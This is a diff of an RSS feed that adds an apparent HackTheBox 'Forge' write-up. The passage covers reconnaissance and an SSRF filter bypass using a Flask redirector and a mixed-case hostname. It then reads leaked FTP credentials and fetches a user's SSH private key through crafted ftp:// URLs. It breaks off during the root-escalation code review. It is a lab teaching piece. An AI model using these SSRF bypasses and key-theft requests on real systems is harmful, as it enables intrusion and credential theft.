@@ -5,7 +5,374 @@
     <link>https://fahmifj.github.io/tags/flask/</link>
     <description>Recent content in Flask on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Sun, 07 Nov 2021 01:42:05 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/flask/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 15 Oct 2022 21:57:48 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/flask/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Forge</title>
+      <link>https://fahmifj.github.io/hackthebox/forge/</link>
+      <pubDate>Sat, 15 Oct 2022 21:57:48 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/forge/</guid>
+      <description>Bypass SSRF filters using domain redirection and abusing Python PDB</description>
+      <content:encoded><![CDATA[<p>Forge features a website that has SSRF vulnerability on its upload page. Leveraging this SSRF allows me to access the internal admin portal to obtain an FTP account. The SSRF vulnerability also exists on this admin portal and can be used to access the FTP server to retrieve the SSH key of the user. For the root part, there&rsquo;s a sudo right on a Python script that spawns an interactive debugging session when an exception event occurs. Since the script can be run as root, it is possible to abuse the interactive debugging session to spawn a root shell.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>SSRF bypass filters</li>
+<li>Code Review</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>nmap</li>
+<li>ffuf</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Scanning TCP ports with nmap discovers 2 open ports: SSH and HTTP. There&rsquo;s also a filtered FTP service.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
+</span></span><span class="line"><span class="cl">$ nmap -sC -sV -oA nmap/default-script-forge 10.10.11.111   
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-13 10:54 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> forge.htb <span class="o">(</span>10.10.11.111<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.066s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">997</span> closed ports
+</span></span><span class="line"><span class="cl">PORT   STATE    SERVICE VERSION
+</span></span><span class="line"><span class="cl">21/tcp filtered ftp
+</span></span><span class="line"><span class="cl">22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open     http    Apache httpd 2.4.41
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Gallery
+</span></span><span class="line"><span class="cl">Service Info: Host: 10.10.11.111<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 11.61 seconds
+</span></span></code></pre></div><p>Beside the OS and service version, the results didn&rsquo;t show any interesting details.</p>
+<p>I will just add <code>forge.htb</code> to my <code>/etc/hosts</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «~» «10.10.15.190» 
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.111 forge.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---forgehtb">TCP 80 - forge.htb</h3>
+<p>The main website shows it&rsquo;s a gallery of images.</p>
+<p><div class="img-container"><img src="imgs/image-20210913200846701.png" alt="image-20210913200846701"  /></div>
+</p>
+<p>Wapplyzer detects the site is running PHP.</p>
+<p><div class="img-container"><img src="imgs/image-20221013203144811.png" alt="image-20221013203144811"  /></div>
+</p>
+<p>There&rsquo;s an upload page <code>/upload</code>. It allows visitors to upload a file from local disk or a URL.</p>
+<p><div class="img-container"><img src="imgs/image-20210913201318274.png" alt="image-20210913201318274"  /></div>
+</p>
+<h4 id="testing-upload">Testing Upload</h4>
+<p>I&rsquo;ll upload a legit JPG file. On submitting, it returns with a new URL to access the file.</p>
+<p><div class="img-container"><img src="imgs/image-20221013210552525.png" alt="image-20221013210552525"  /></div>
+</p>
+<p>Since the filename get randomized, I assume it&rsquo;s not kind of IDOR attack.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tools» «10.10.15.190» 
+</span></span><span class="line"><span class="cl">$ curl -IL http://forge.htb/uploads/nMu63RoLNdk8BoE2a7b4 
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Date: Thu, <span class="m">13</span> Sept <span class="m">2021</span> 14:06:11 GMT
+</span></span><span class="line"><span class="cl">Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Content-Disposition: inline<span class="p">;</span> <span class="nv">filename</span><span class="o">=</span>nMu63RoLNdk8BoE2a7b4
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">51142</span>
+</span></span><span class="line"><span class="cl">Last-Modified: Thu, <span class="m">13</span> Sept <span class="m">2021</span> 14:05:20 GMT
+</span></span><span class="line"><span class="cl">Cache-Control: no-cache
+</span></span><span class="line"><span class="cl">Content-Type: image/jpg
+</span></span></code></pre></div><p>This time I&rsquo;ll try the <strong>upload from url</strong> option. I&rsquo;ll start a Python web server listening on port 8000. On submitting, there is a request coming from Forge&rsquo;s IP.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «~» «10.10.15.190» 
+</span></span><span class="line"><span class="cl">$ hostit
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">8000</span> <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+</span></span><span class="line"><span class="cl">10.10.11.111 - - <span class="o">[</span>13/Sep/2021 09:23:38<span class="o">]</span> <span class="s2">&#34;GET /innocent.jpg HTTP/1.1&#34;</span> <span class="m">200</span> -
+</span></span></code></pre></div><p>With <code>netcat</code>, I could see the detailed request, where the website uses Python request module to fetch my hosted file. So I&rsquo;m guessing that the site is running Python (most likely Flask).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «~» «10.10.15.190» 
+</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">8000</span> 
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">8000</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.15.190<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.111<span class="o">]</span> <span class="m">43242</span>
+</span></span><span class="line"><span class="cl">GET /innocent.jpg HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 10.10.15.190:8000
+</span></span><span class="line"><span class="cl">User-Agent: python-requests/2.25.1
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">too many output retries : Broken pipe
+</span></span></code></pre></div><p>With non existent item, it shows an error which can proves it&rsquo;s running Python in the back end.</p>
+<p><div class="img-container"><img src="imgs/image-20210913203132729.png" alt="	"  /></div>
+</p>
+<p>When attempting to access <code>localhost</code> and <code>127.0.0.1</code> , the website tells these are blacklisted.</p>
+<p><div class="img-container"><img src="imgs/image-20210913203935343.png" alt=" "  /></div>
+</p>
+<p>How about FTP? Well I get a message that tells it only supports http and https. Therefore, I shouldn&rsquo;t be able to access the FTP server with this.</p>
+<p><div class="img-container"><img src="imgs/image-20221013213206158.png" alt="image-20221013213206158"  /></div>
+</p>
+<h3 id="vhost-enumeration">Vhost Enumeration</h3>
+<p>Fuzzing the vhost with <code>ffuf</code> reveals an interesting subdomain: <code>admin.forge.htb</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tools» «10.10.15.190» 
+</span></span><span class="line"><span class="cl">$ ffuf -u http://forge.htb -H <span class="s2">&#34;Host: FUZZ.forge.htb&#34;</span> -mc <span class="m">200</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
+</span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
+</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
+</span></span><span class="line"><span class="cl">        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
+</span></span><span class="line"><span class="cl">          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       v1.3.0-dev
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> :: Method           : GET
+</span></span><span class="line"><span class="cl"> :: URL              : http://forge.htb
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+</span></span><span class="line"><span class="cl"> :: Header           : Host: FUZZ.forge.htb
+</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
+</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: <span class="m">200</span>
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">admin                   <span class="o">[</span>Status: 200, Size: 27, Words: 4, Lines: 2<span class="o">]</span>
+</span></span></code></pre></div><p>I&rsquo;ll add that to my <code>/etc/hosts</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tools» «10.10.15.190» 
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.111 admin.forge.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</span></span></code></pre></div><h3 id="tcp-80---adminforgehtb">TCP 80 - admin.forge.htb</h3>
+<p>Unfortunately, <code>admin.forge.htb</code> is not reachable from external.</p>
+<p><div class="img-container"><img src="imgs/image-20210913210859484.png" alt="image-20210913210859484"  /></div>
+</p>
+<p>Accessing this domain from the upload feature would return the blacklisted address message.</p>
+<p><div class="img-container"><img src="imgs/image-20210913212229777.png" alt="image-20210913212229777"  /></div>
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-user">Shell as user</h3>
+<h4 id="ssrf-bypass-with-domain-redirection">SSRF Bypass with Domain Redirection</h4>
+<p>Several SSRF bypass payload with number-based are actually works, but I&rsquo;ve to find domain-based bypass since my interest is the <code>admin.forge.htb</code>.</p>
+<blockquote>
+<p><code>admin.forge.htb</code> and <code>forge.htb</code> are name-based vhost</p>
+</blockquote>
+<p>According to the PayloadAllTheThings, it&rsquo;s possible to bypass SSRF using a domain redirection. Since I know that the site uses Python redirection, there&rsquo;s a high chance domain redirection can bypass the filters because <code>requests</code> always follow redirection by default.</p>
+<p>The strategy is:</p>
+<ul>
+<li>Host a simple site (I&rsquo;ll name it <strong>redirector</strong>) that always redirect any incoming request to <code>http://admin.forge.htb</code>.</li>
+<li>Submit this site URL on the upload page at <code>forge.htb</code>.</li>
+</ul>
+<p>Here&rsquo;s the visualization😅.</p>
+<p><div class="img-container"><img src="imgs/image-20221015214529436.png" alt="image-20221015214529436"  /></div>
+</p>
+<p>I&rsquo;ll write the redirector using Flask.</p>
+<p><code>redirector.py</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">redirect</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s2">&#34;http://admin.forge.htb/&#34;</span><span class="p">,</span><span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">)</span>
+</span></span></code></pre></div><p>I&rsquo;ll run the redirector with:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.13» 
+</span></span><span class="line"><span class="cl">$ python3 redirector.py
+</span></span></code></pre></div><p>After the redirector is running, I&rsquo;ll head to the upload page, intercept the upload request and change the URL value to my machine IP.</p>
+<p>On submitting the request, I see there&rsquo;s a success message in the response.</p>
+<p><div class="img-container"><img src="imgs/image-20221015112628345.png" alt="image-20221015112628345"  /></div>
+</p>
+<p>That worked!</p>
+<h4 id="ssrf-bypass-with-mixed-case">SSRF Bypass with Mixed Case</h4>
+<p>Another way to bypass the filters is mixing upper case and lower case on the domain name like <code>admin.forge.htB</code>:</p>
+<p><div class="img-container"><img src="imgs/image-20210913214359458.png" alt="image-20210913214359458"  /></div>
+</p>
+<p>Since mixed case is less complicated, I&rsquo;ll prefer using it here.</p>
+<p>With <code>curl</code>, I could see the page source of <code>admin.forge.htb</code>. There&rsquo;s two links here: <code>/announcements</code> and another <code>/upload</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.13» 
+</span></span><span class="line"><span class="cl">$ curl -s http://forge.htb/uploads/mn4G5G1B5oaF2SXMwbHH
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">&lt;head&gt;
+</span></span><span class="line"><span class="cl">    &lt;title&gt;Admin Portal&lt;/title&gt;
+</span></span><span class="line"><span class="cl">&lt;/head&gt;
+</span></span><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">    &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/main.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">    &lt;header&gt;
+</span></span><span class="line"><span class="cl">            &lt;nav&gt;
+</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/&#34;</span>&gt;Portal home&lt;/a&gt;&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;align-right margin-right&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/announcements&#34;</span>&gt;Announcements&lt;/a&gt;&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;align-right&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/upload&#34;</span>&gt;Upload image&lt;/a&gt;&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">            &lt;/nav&gt;
+</span></span><span class="line"><span class="cl">    &lt;/header&gt;
+</span></span><span class="line"><span class="cl">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+</span></span><span class="line"><span class="cl">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+</span></span><span class="line"><span class="cl">    &lt;center&gt;&lt;h1&gt;Welcome Admins!&lt;/h1&gt;&lt;/center&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;
+</span></span></code></pre></div><p>Accessing <code>/announcements</code> via SSRF reveals interesting information:</p>
+<ul>
+<li>An FTP account</li>
+<li>The upload feature in this admin portal now supports FTP and upload via query string <code>u</code> (<code>/upload?u=value</code>).</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
+</span></span><span class="line"><span class="cl">$ curl -s http://forge.htb/uploads/NatO83YkYfhzkl9fG9MB
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">&lt;head&gt;
+</span></span><span class="line"><span class="cl">    &lt;title&gt;Announcements&lt;/title&gt;
+</span></span><span class="line"><span class="cl">&lt;/head&gt;
+</span></span><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">    &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/main.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">    &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/announcements.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">    &lt;header&gt;
+</span></span><span class="line"><span class="cl">            &lt;nav&gt;
+</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/&#34;</span>&gt;Portal home&lt;/a&gt;&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;align-right margin-right&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/announcements&#34;</span>&gt;Announcements&lt;/a&gt;&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;align-right&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/upload&#34;</span>&gt;Upload image&lt;/a&gt;&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">            &lt;/nav&gt;
+</span></span><span class="line"><span class="cl">    &lt;/header&gt;
+</span></span><span class="line"><span class="cl">    &lt;br&gt;&lt;br&gt;&lt;br&gt;
+</span></span><span class="line"><span class="cl">    &lt;ul&gt;
+</span></span><span class="line"><span class="cl">        &lt;li&gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&lt;/li&gt;
+</span></span><span class="line"><span class="cl">        &lt;li&gt;The /upload endpoint now supports ftp, ftps, http and https protocols <span class="k">for</span> uploading from url.&lt;/li&gt;
+</span></span><span class="line"><span class="cl">        &lt;li&gt;The /upload endpoint has been configured <span class="k">for</span> easy scripting of uploads, and <span class="k">for</span> uploading an image, one can simply pass a url with ?u<span class="o">=</span><span class="p">&amp;</span>lt<span class="p">;</span>url<span class="p">&amp;</span>gt<span class="p">;</span>.&lt;/li&gt;
+</span></span><span class="line"><span class="cl">    &lt;/ul&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;
+</span></span></code></pre></div><h4 id="ftp-access">FTP Access</h4>
+<p>From here, I can try accessing the FTP service via the upload feature on the admin portal using the same SSRF bypass technique.</p>
+<p><div class="img-container"><img src="imgs/image-20221015121407530.png" alt="image-20221015121407530"  /></div>
+</p>
+<p>It seems the FTP host the user home dir. The user flag is done here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
+</span></span><span class="line"><span class="cl">$ curl -s http://forge.htb/uploads/0c47HKRZiXNh3F5smn2z
+</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">3</span> <span class="m">1000</span>     <span class="m">1000</span>         <span class="m">4096</span> Aug <span class="m">04</span> 19:23 snap
+</span></span><span class="line"><span class="cl">-rw-r-----    <span class="m">1</span> <span class="m">0</span>        <span class="m">1000</span>           <span class="m">33</span> Sep <span class="m">13</span> 08:17 user.txt
+</span></span></code></pre></div><h4 id="ssh-access">SSH Access</h4>
+<p>For more stable access, I&rsquo;ll check if there&rsquo;s an SSH key:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://admin.forge.htB/upload?u=ftp://:heightofsecurity123!@forge.htB/.ssh/
+</span></span></code></pre></div><p>It&rsquo;s there.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
+</span></span><span class="line"><span class="cl">$ curl -s http://forge.htb/uploads/AC1f3sbHcufWHGGTVpIG 
+</span></span><span class="line"><span class="cl">-rw-------    <span class="m">1</span> <span class="m">1000</span>     <span class="m">1000</span>          <span class="m">564</span> May <span class="m">31</span> 12:35 authorized_keys
+</span></span><span class="line"><span class="cl">-rw-------    <span class="m">1</span> <span class="m">1000</span>     <span class="m">1000</span>         <span class="m">2590</span> May <span class="m">20</span> 08:30 id_rsa
+</span></span><span class="line"><span class="cl">-rw-------    <span class="m">1</span> <span class="m">1000</span>     <span class="m">1000</span>          <span class="m">564</span> May <span class="m">20</span> 08:30 id_rsa.pub
+</span></span></code></pre></div><p>I&rsquo;ll grab that with</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://admin.forge.htB/upload?u=ftp://:heightofsecurity123!@forge.htB/.ssh/id_rsa
+</span></span></code></pre></div><p>And save it to my machine.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
+</span></span><span class="line"><span class="cl">$ curl -s http://forge.htb/uploads/hvcNBsh1xwD4c6Nyq0tP <span class="p">|</span> tee user_rsa
+</span></span><span class="line"><span class="cl">-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span class="line"><span class="cl">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">nR7k4+Pryk8HqgNS3/g1/Fpd52DDziDOAIfORntwkuiQSlg63hF3vadCAV3KIVLtBONXH2
+</span></span><span class="line"><span class="cl"><span class="nv">shlLupso7WoS0AAAAKdXNlckBmb3JnZQE</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl">-----END OPENSSH PRIVATE KEY-----
+</span></span></code></pre></div><p>Now I can SSH login as <code>user</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
+</span></span><span class="line"><span class="cl">$ chmod <span class="m">600</span> user_rsa <span class="o">&amp;&amp;</span> ssh -i user_rsa user@forge.htb  
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-81-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System information as of Mon <span class="m">13</span> Sep <span class="m">2021</span> 03:12:44 PM UTC
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:  0.0               Processes:             <span class="m">223</span>
+</span></span><span class="line"><span class="cl">  Usage of /:   44.5% of 6.82GB   Users logged in:       <span class="m">0</span>
+</span></span><span class="line"><span class="cl">  Memory usage: 26%               IPv4 address <span class="k">for</span> eth0: 10.10.11.111
+</span></span><span class="line"><span class="cl">  Swap usage:   0%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Mon Sep <span class="m">13</span> 13:30:33 <span class="m">2021</span> from 10.10.14.141
+</span></span><span class="line"><span class="cl">user@forge:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
+</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p><code>user</code> is allowed to run <code>/opt/remote-manage.py</code> as root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@forge:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> user on forge:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User user may run the following commands on forge:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
+</span></span><span class="line"><span class="cl">user@forge:~$ ls -l /opt/remote-manage.py
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">1447</span> May <span class="m">31</span> 12:09 /opt/remote-manage.py
+</span></span></code></pre></div><h4 id="source-code-review">Source Code Review</h4>
+<p>Looking at the source code, this script is a simple tool for monitoring process, disk, and network sockets.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
